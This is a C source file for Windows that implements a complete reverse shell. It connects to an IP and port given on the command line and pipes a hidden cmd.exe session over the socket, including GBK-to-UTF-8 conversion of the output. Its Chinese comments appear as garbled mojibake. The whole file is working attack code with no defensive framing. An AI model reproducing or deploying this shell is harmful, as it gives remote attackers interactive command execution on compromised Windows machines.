#include <winsock2.h>             // Windows Socket ���ͷ�ļ�
#include <windows.h>              // Windows API ͷ�ļ�
#include <stdio.h>                // ��׼�������
#include <string.h>               // �ַ���������
#include "gbk.h"                  // �Զ��� gbk ת utf-8 ��ͷ�ļ��������Լ�ʵ�֣�

#pragma comment(lib, "ws2_32.lib") // ���� ws2_32.lib��Socket �����

HANDLE hReadOut, hWriteIn;        // �ܵ��������ȡ�ӽ��������д���ӽ�������
SOCKET sock = INVALID_SOCKET;     // ����ȫ�� Socket ����

								  // ��ȡ�ӽ��̣�cmd�����������ͨ�� socket ����Զ��
DWORD WINAPI ReadOutputThread(LPVOID param) {
	char buffer[1024];
	DWORD bytesRead;
	while (1) {
		// ���ӽ��� stdout �ܵ��ж�ȡ�������
		BOOL success = ReadFile(hReadOut, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
		if (!success || bytesRead == 0) break; // ��ȡʧ�ܻ�������˳�ѭ��
		buffer[bytesRead] = '\0'; // ��� null ��ֹ������ֹ����

								  // ���Խ� GBK ����תΪ UTF-8 ���ͣ��������룩
		char* utf8_buf = gbk_to_utf8(buffer);
		if (utf8_buf) {
			send(sock, utf8_buf, (int)strlen(utf8_buf), 0); // ����ת��������
			free(utf8_buf); // �ͷ��ڴ�
		}
		else {
			send(sock, buffer, bytesRead, 0); // ����ԭʼ����
		}
	}
	return 0;
}

// ��ȡ socket �е����ݲ�д���ӽ��̣�cmd��������ܵ�
DWORD WINAPI SocketReadThread(LPVOID param) {
	char buffer[512];
	int ret;
	while (1) {
		ret = recv(sock, buffer, sizeof(buffer), 0); // ��Զ�˽�������
		if (ret <= 0) break; // ����ʧ�ܻ����ӹر�
		DWORD bytesWritten;
		WriteFile(hWriteIn, buffer, ret, &bytesWritten, NULL); // д�� cmd �� stdin
	}
	return 0;
}

int main(int argc, char *argv[]) {
	// �����������Ƿ�Ϊ 2��IP �Ͷ˿ڣ�
	if (argc != 3) {
		printf("Usage: %s <IP> <PORT>\n", argv[0]);
		return 1;
	}

	const char *ip = argv[1];
	int port = atoi(argv[2]); // �ַ����˿�ת int
	if (port <= 0 || port > 65535) {
		printf("Invalid port number: %s\n", argv[2]);
		return 1;
	}

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData); // ��ʼ�� WinSock

										  // ���� TCP socket
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		printf("Socket error\n");
		return 1;
	}

	// ����Ŀ���ַ�ṹ��
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(port); // ���ö˿ڣ������ֽ���ת�����ֽ���
	server.sin_addr.s_addr = inet_addr(ip); // ���� IP ��ַ

											// ��������Զ�̷�����
	if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
		printf("Connect failed\n");
		closesocket(sock);
		return 1;
	}

	// ���ùܵ����ԣ�����̳о��
	SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
	HANDLE hWriteOut, hReadIn;
	STARTUPINFOA si = { sizeof(si) }; // ������������ṹ��
	PROCESS_INFORMATION pi; // �洢�´������̵���Ϣ

							// ���� stdout �ܵ���cmd ��� -> �����ȡ��
	CreatePipe(&hReadOut, &hWriteOut, &sa, 0);
	SetHandleInformation(hReadOut, HANDLE_FLAG_INHERIT, 0); // ��ֹ�̳ж�ȡ��

															// ���� stdin �ܵ�������д�� -> cmd ���룩
	CreatePipe(&hReadIn, &hWriteIn, &sa, 0);
	SetHandleInformation(hWriteIn, HANDLE_FLAG_INHERIT, 0); // ��ֹ�̳�д���

															// ���� cmd �ı�׼�������ָ��ܵ�
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdOutput = hWriteOut;
	si.hStdError = hWriteOut;
	si.hStdInput = hReadIn;

	// ���� cmd.exe��/Q ��Ĭģʽ����������������ض���
	if (!CreateProcessA(NULL, "cmd.exe /Q", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		printf("CreateProcess failed: %lu\n", GetLastError());
		closesocket(sock);
		return 1;
	}

	// �����̹رղ���Ҫ�ľ��
	CloseHandle(hWriteOut);
	CloseHandle(hReadIn);

	// �����̣߳���ȡ cmd �������ȡ socket ����
	HANDLE hThreadOut = CreateThread(NULL, 0, ReadOutputThread, NULL, 0, NULL);
	HANDLE hThreadIn = CreateThread(NULL, 0, SocketReadThread, NULL, 0, NULL);

	// �ȴ��ӽ��̣�cmd���˳�
	WaitForSingleObject(pi.hProcess, INFINITE);

	// ����������Դ
	CloseHandle(hThreadOut);
	CloseHandle(hThreadIn);
	CloseHandle(hWriteIn);
	CloseHandle(hReadOut);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	closesocket(sock);
	WSACleanup(); // ���� WinSock
	return 0;
}
